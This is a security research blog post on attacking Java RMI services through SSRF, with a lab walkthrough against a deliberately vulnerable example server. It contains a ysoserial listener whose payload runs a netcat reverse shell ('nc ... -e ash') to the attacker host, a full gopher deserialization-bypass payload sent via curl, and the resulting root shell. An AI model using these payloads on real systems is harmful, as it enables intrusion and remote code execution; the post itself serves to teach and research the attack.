---
title: "Attacking Java RMI via SSRF"
date: 2021-12-10
author: "Tobias Neitzel"

tags: 
- rmi
- jmx
- ssrf
- java rmi
- remote-method-guesser

categories:
- java
- ssrf

ShowToc: True
cover:
    image: "/img/01-rmi-ssrf/01-intro.png"
    alt: "Attacking Java RMI via SSRF"
---


During the last couple of years, *SSRF* vulnerabilities
have become more and more popular and several high impact
vulnerabilities have been identified. Possible targets in
the backend range from *HTTP* based services like *Solr*,
over cloud metadata services, up to more exotic targets
like *redis* databases. In this blog post we discuss the
*SSRFibility* of *Java RMI* and demonstrate how *RMI*
services can be targeted via *SSRF*.


### The SSRFibility of Java RMI

---

*Java RMI* is an object oriented *RPC* (*Remote Procedure Call*) mechanism
that is available by default in most *Java* installations. Developers can
use *Java RMI* to create *remote objects* that expose their functions on
the network and allow remote clients to call them. *Java RMI* communication
relies on serialized *Java* objects, which makes the protocol a prime target
for attackers. Over the last couple of years, the security of *Java RMI*
has vastly improved, but vulnerable endpoints are still encountered quite
frequently. Moreover, even a fully patched *RMI* service can yield as an
entry point for attackers when the available *remote objects* expose dangerous
functions.

If you ever implemented something yourself using *Java RMI*, you probably
doubt that the protocol can be targeted by *SSRF* attacks. For those who
never used *Java RMI* in practice, here is a short example how a typical *RMI*
client looks like:

```java
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class ExampleClient {

  public static void main(String[] args) {

    try {
      Registry registry = LocateRegistry.getRegistry(remoteHost);
      RemoteService ref = (RemoteService)registry.lookup("remote-service");
      String response = ref.getVersion();
    
    } catch( Exception e) {
      e.printStackTrace();
    }
  }
}
```

This code snipped does basically the following:

1. Connect to an *RMI registry* (name service for *remote objects*. Can be compared to *DNS*)
2. Lookup the name ``remote-service`` to obtain a reference to an *remote object*
3. Call the ``getVersion`` function on the *remote object*

Despite ``ref`` is an object created in your local *JVM*, calls on this object
are forwarded to the *RMI* server. This demonstrates that *Java RMI* uses an *object
oriented RPC* mechanism, where local objects are used to consume remote services.
This *object oriented RPC* implementation creates the impression of a strong coupling
between the local objects and the remote service which makes *SSRF* attacks seem impossible.
But this is not the case as the *RMI protocol* is, like *HTTP*, a stateless protocol and
there is only a loosely coupling between local objects and remote services. But we go ahead
of ourselves as we should start with the *RMI registry*.

#### The RMI Registry

The *RMI registry* is a naming service that is often used to make *RMI* services available
on the network. In order to connect to a *remote object*, clients usually need a certain
amount of information:

* The IP address and TCP port the *remote object* is available on
* The class / interface that is implemented by the *remote object*
* The ``ObjID`` of the *remote object* (an internal identifier)

All this information is stored within the *RMI registry*  and can be accessed under a human readable
name (*boundname*). In the example above, we looked up the human readable name ``remote-service``
from the *RMI registry* and obtained a reference to the corresponding *remote object*. This reference
stores all the required information for remote procedure calls and forwards method invocations to
the *remote object*.

An important detail is now, that the *RMI registry* is a *remote object* itself, but in contrast
to the ``RemoteService`` *remote object*, the *RMI registry* is a well known *remote object*. This
means, that the implemented class and the assigned ``ObjID`` are fixed and known by *RMI clients*.
Hence, to communicate with the *RMI registry*, only the IP address and the TCP port are required.
This makes the *RMI registry* an easier target for *SSRF* attacks and we discuss it first before
going over to non well known *RMI services*.

#### The Java RMI Protocol

Whether or not the *RMI registry* can now be targeted by *SSRF* attacks depends on the structure of the
*RMI* protocol. In the following diagram I tried to visualize how a typical *RMI* communication looks like:

![Java RMI Protocol](/img/01-rmi-ssrf/02-java-rmi-protocol.png)

The typical *RMI* communication consists out of a *handshake* and one or more *method calls*. During the
*handshake*, some static data and information on the server and client host are exchanged. It is worth noting
that none of the exchanged information depends on previously received data. Therefore, it is possible
to predict all values that are used in the handshake, which will be important when performing *SSRF* attacks.

After the *handshake* completed, the client can start to dispatch method calls. It is generally possible
to dispatch multiple method calls in one communication channel, but apart from reducing the amount of
network traffic, it does not has any benefits. As mentioned previously, the *RMI* protocol is stateless and
it makes no difference whether multiple calls are dispatched in one or within multiple communication channels.

From the *SSRF* perspective, the handshake part of the *RMI* protocol looks problematic. *SSRF* vulnerabilities
usually only allow a one shot kind of attack and interactive communication like a handshake is not possible.
In the case of *Java RMI* however, the handshake does not matter, as the *RMI server* reads data one by one from
the underlying *TCP* stream. This allows the client to send all required data right at the beginning without waiting
for any server responses. The following diagram shows the *RMI* protocol again, but this time how it would be
utilized during an *SSRF* attack:

![Java RMI Protocol During SSRF](/img/01-rmi-ssrf/03-java-rmi-protocol-ssrf.png)

Another problem we have not talked about so far are data types. It should be obvious that a basic *HTTP* based
*SSRF* vulnerability cannot be utilized to perform *SSRF* attacks on *RMI* services. Already the first few bytes
(*RMI Magic*) would cause an corrupted stream and lead to an error on the *RMI* service. Instead, you need to be
able to send arbitrary bytes to the target *RMI service*, which is an annoying restriction. Especially null bytes need
to be allowed, which causes problems even with *gopher* based *SSRF* attacks on newer curl versions \[[1](https://www.digeex.de/blog/tinytinyrss/)\].
However, when this condition is met and you can send arbitrary data to the *RMI* service, you can dispatch
calls as with a direct connection.

#### The ObjID Problem

An attack as demonstrated in *figure 2* requires the client to know all data that needs to be send to the *RMI server*
in advance. This is possible for well known *RMI* services with a fixed ``ObjID`` value like the *RMI registry* (``ObjID = 0``),
the *Activation System* (``ObjID = 1``) or the *Distributed Garbage Collector* (``ObjID = 2``).



### Attacking the RMI Registry

To demonstrate the *SSRFibility* of the *Java RMI* protocol, we will now attack an *RMI registry* endpoint using a
webapplication that is vulnerable to *SSRF* attacks. In order to make this as comfortable as possible, we use *remote-method-guesser*
\[[2](https://github.com/qtc-de/remote-method-guesser)\], a *Java RMI* vulnerability scanner with integrated *SSRF* support.
The *remote-method-guesser* repository also contains an *SSRF* example server \[[3](https://github.com/qtc-de/remote-method-guesser/pkgs/container/remote-method-guesser%2Frmg-ssrf-server)\]
that we can use for demonstration purposes. The setup for the following demonstration looks like this:

* *HTTP* service vulnerable to *SSRF* within the ``url`` parameter on ``http://172.17.0.2:8000``
* *RMI registry* listening at ``localhost:1090`` on the remote server
* Outdated Java version that is vulnerable to *RMI registry* deserialization bypasses
* ``CommonsCollections3.1`` being available on the *RMI* application's classpath
* The *SSRF* vulnerability is *curl* based and allows null bytes within the *gopher* protocol

We start of with an *nmap* scan to demonstrate that no *RMI* ports are exposed directly by the application server:

```console
$ nmap -p- -n 172.17.0.2
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-20 07:57 CET
Nmap scan report for 172.17.0.2
Host is up (0.000094s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 1.50 seconds
```

To demonstrate the *SSRF* vulnerability, we just use a plain *HTTP* callback:

```console
$ curl 'http://172.17.0.2:8000?url=http://172.17.0.1:8000/PoC'
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.17.0.2 - - [20/Dec/2021 08:01:20] "GET /PoC HTTP/1.1" 200 -
```

Now we perform a deserialization attack on the *RMI registry*. The *Java* version on the application server
already implements deserialization filters for *registry* communication, but is vulnerable to known deserialization
filter bypasses. These bypasses work by creating an outbound *RMI* connection to an attacker controlled server.
This outbound connection is no longer protected by deserialization filters and can be used to achieve arbitrary
deserialization.

First we create the required listeners: One for the incoming *RMI* connection, the other for the incoming shell:

```console
$ rmg listen 0.0.0.0 4444 CommonsCollections6 'nc 172.17.0.1 4445 -e ash'
[+] Creating ysoserial payload... done.
[+] Creating a JRMPListener on 0.0.0.0:4444.
[+] Handing off to ysoserial...

$ nc -vlp 4445
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4445
Ncat: Listening on 0.0.0.0:4445
```

Now we create the *SSRF* payload. Creating *SSRF* payloads with *remote-method-guesser* is quite simple. Almost
each operation supports the ``--ssrf`` option. Instead of performing the corresponding operation on a remote server,
a corresponding *SSRF* payload is printed to stdout. For our purpose we need to target the *RMI registry* on the
remote server which listens on ``localhost:1090``. Furthermore, we use the ``AnTrinh`` payload, which is the most
recent deserialization filter bypass:

```console
$ rmg serial 127.0.0.1 1090 AnTrinh 172.17.0.1:4444 --component reg --ssrf --gopher --encode 
[+] Attempting deserialization attack on RMI Registry endpoint...
[+]
[+] 	SSRF Payload: gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2544%2515%254d%25c9%25d4%25e6%253b%25df%2573%2572%2500%2523%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2555%256e%2569%2563%2561%2573%2574%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%2545%2509%2512%2515%25f5%25e2%257e%2531%2502%2500%2503%2549%2500%2504%2570%256f%2572%2574%254c%2500%2503%2563%2573%2566%2574%2500%2528%254c%256a%2561%2576%2561%252f%2572%256d%2569%252f%2573%2565%2572%2576%2565%2572%252f%2552%254d%2549%2543%256c%2569%2565%256e%2574%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%253b%254c%2500%2503%2573%2573%2566%2574%2500%2528%254c%256a%2561%2576%2561%252f%2572%256d%2569%252f%2573%2565%2572%2576%2565%2572%252f%2552%254d%2549%2553%2565%2572%2576%2565%2572%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%253b%2570%2578%2572%2500%251c%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%2553%2565%2572%2576%2565%2572%25c7%2519%2507%2512%2568%25f3%2539%25fb%2502%2500%2500%2570%2578%2572%2500%251c%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%25d3%2561%25b4%2591%250c%2561%2533%251e%2503%2500%2500%2570%2578%2570%2577%2513%2500%2511%2555%256e%2569%2563%2561%2573%2574%2553%2565%2572%2576%2565%2572%2552%2565%2566%2532%2578%2500%2500%2500%2500%2570%2573%257d%2500%2500%2500%2502%2500%2526%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%254d%2549%2553%2565%2572%2576%2565%2572%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%2500%250f%256a%2561%2576%2561%252e%2572%256d%2569%252e%2552%2565%256d%256f%2574%2565%2570%2578%2572%2500%2517%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%2572%2565%2566%256c%2565%2563%2574%252e%2550%2572%256f%2578%2579%25e1%2527%25da%2520%25cc%2510%2543%25cb%2502%2500%2501%254c%2500%2501%2568%2574%2500%2525%254c%256a%2561%2576%2561%252f%256c%2561%256e%2567%252f%2572%2565%2566%256c%2565%2563%2574%252f%2549%256e%2576%256f%2563%2561%2574%2569%256f%256e%2548%2561%256e%2564%256c%2565%2572%253b%2570%2578%2570%2573%2572%2500%252d%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%2549%256e%2576%256f%2563%2561%2574%2569%256f%256e%2548%2561%256e%2564%256c%2565%2572%2500%2500%2500%2500%2500%2500%2500%2502%2502%2500%2500%2570%2578%2571%2500%257e%2500%2504%2577%2533%2500%250a%2555%256e%2569%2563%2561%2573%2574%2552%2565%2566%2500%250a%2531%2537%2532%252e%2531%2537%252e%2530%252e%2531%2500%2500%2511%255c%2500%2500%2500%2500%2500%2500%2500%257b%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2578
```

*SSRF* payloads can be generated in different formats. We choose *gopher* format and *URL* encode the
payload to make it directly usable within a *curl* command. Now we only need to send this payload to the
remote server:

```console
$ curl 'http://172.17.0.2:8000?url=gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2544%2515%254d%25c9%25d4%25e6%253b%25df%2573%2572%2500%2523%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2555%256e%2569%2563%2561%2573%2574%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%2545%2509%2512%2515%25f5%25e2%257e%2531%2502%2500%2503%2549%2500%2504%2570%256f%2572%2574%254c%2500%2503%2563%2573%2566%2574%2500%2528%254c%256a%2561%2576%2561%252f%2572%256d%2569%252f%2573%2565%2572%2576%2565%2572%252f%2552%254d%2549%2543%256c%2569%2565%256e%2574%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%253b%254c%2500%2503%2573%2573%2566%2574%2500%2528%254c%256a%2561%2576%2561%252f%2572%256d%2569%252f%2573%2565%2572%2576%2565%2572%252f%2552%254d%2549%2553%2565%2572%2576%2565%2572%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%253b%2570%2578%2572%2500%251c%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%2553%2565%2572%2576%2565%2572%25c7%2519%2507%2512%2568%25f3%2539%25fb%2502%2500%2500%2570%2578%2572%2500%251c%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%25d3%2561%25b4%2591%250c%2561%2533%251e%2503%2500%2500%2570%2578%2570%2577%2513%2500%2511%2555%256e%2569%2563%2561%2573%2574%2553%2565%2572%2576%2565%2572%2552%2565%2566%2532%2578%2500%2500%2500%2500%2570%2573%257d%2500%2500%2500%2502%2500%2526%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%254d%2549%2553%2565%2572%2576%2565%2572%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%2500%250f%256a%2561%2576%2561%252e%2572%256d%2569%252e%2552%2565%256d%256f%2574%2565%2570%2578%2572%2500%2517%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%2572%2565%2566%256c%2565%2563%2574%252e%2550%2572%256f%2578%2579%25e1%2527%25da%2520%25cc%2510%2543%25cb%2502%2500%2501%254c%2500%2501%2568%2574%2500%2525%254c%256a%2561%2576%2561%252f%256c%2561%256e%2567%252f%2572%2565%2566%256c%2565%2563%2574%252f%2549%256e%2576%256f%2563%2561%2574%2569%256f%256e%2548%2561%256e%2564%256c%2565%2572%253b%2570%2578%2570%2573%2572%2500%252d%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%2549%256e%2576%256f%2563%2561%2574%2569%256f%256e%2548%2561%256e%2564%256c%2565%2572%2500%2500%2500%2500%2500%2500%2500%2502%2502%2500%2500%2570%2578%2571%2500%257e%2500%2504%2577%2533%2500%250a%2555%256e%2569%2563%2561%2573%2574%2552%2565%2566%2500%250a%2531%2537%2532%252e%2531%2537%252e%2530%252e%2531%2500%2500%2511%255c%2500%2500%2500%2500%2500%2500%2500%257b%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2578'
```

This should cause incoming connections on our listeners and we should obtain a shell:

```console
$ rmg listen 0.0.0.0 4444 CommonsCollections6 'nc 172.17.0.1 4445 -e ash'
[+] Creating ysoserial payload... done.
[+] Creating a JRMPListener on 0.0.0.0:4444.
[+] Handing off to ysoserial...
Have connection from /172.17.0.2:51246
Reading message...
Sending return with payload for obj [0:0:0, 123]
Closing connection

$ nc -vlp 4445
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4445
Ncat: Listening on 0.0.0.0:4445
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:33809.
id
uid=0(root) gid=0(root) groups=0(root)
```

We successfully used a blind *SSRF* vulnerability to attack a vulnerable *RMI registry*.

### References

----

* \[1\] [Exploiting Tiny Tiny RSS](https://www.digeex.de/blog/tinytinyrss/)
* \[2\] [remote-method-guesser (GitHub)](https://github.com/qtc-de/remote-method-guesser)
* \[3\] [ssrf-example-server (GitHub)](https://github.com/qtc-de/remote-method-guesser/pkgs/container/remote-method-guesser%2Frmg-ssrf-server)
